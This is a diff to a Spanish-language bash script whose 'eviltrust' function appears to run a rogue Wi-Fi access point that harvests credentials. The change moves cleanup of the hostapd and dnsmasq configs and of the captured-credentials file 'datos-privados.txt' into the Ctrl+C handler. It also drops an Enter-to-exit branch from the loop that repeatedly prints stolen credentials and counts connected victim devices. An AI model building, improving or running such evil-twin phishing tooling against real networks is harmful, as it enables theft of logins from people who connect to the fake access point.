@@ -22,6 +22,9 @@ ctrl_c() {
 	sudo systemctl start NetworkManager > /dev/null 2>&1
 	ifconfig $tar up > /dev/null 2>&1
 	tput cnorm
+	sudo rm dnsmasq.conf hostapd.conf 2>/dev/null
+	rm -r iface 2>/dev/null
+	find \-name datos-privados.txt | xargs rm 2>/dev/null
 	exit
 }
 
@@ -349,20 +352,13 @@ eviltrust() {
 		activeHosts=0
 		tput civis
 		while true; do
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Enter para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctrl + C para salir${endColour}${grayColour})...${endColour}\n${endColour}"
 			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 			echo -e "${redColour}[*]$grayColour Dispositivos conectados: ${endColour}${blueColour}$activeHosts${endColour}\n"
 			find \-name datos-privados.txt | xargs cat 2>/dev/null
 			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 			activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
 			sleep 3; clear
-			if read -p "" -n 1 -r && [[ $REPLY == $'\n' ]]; then
-				echo -e "\n\n${redColour}[!]${endColour}${grayColour} Saliendo...\n${endColour}"
-				sudo rm dnsmasq.conf hostapd.conf 2>/dev/null
-				rm -r iface 2>/dev/null
-				find \-name datos-privados.txt | xargs rm 2>/dev/null
-				tput cnorm
-			fi
 		done
 }
 
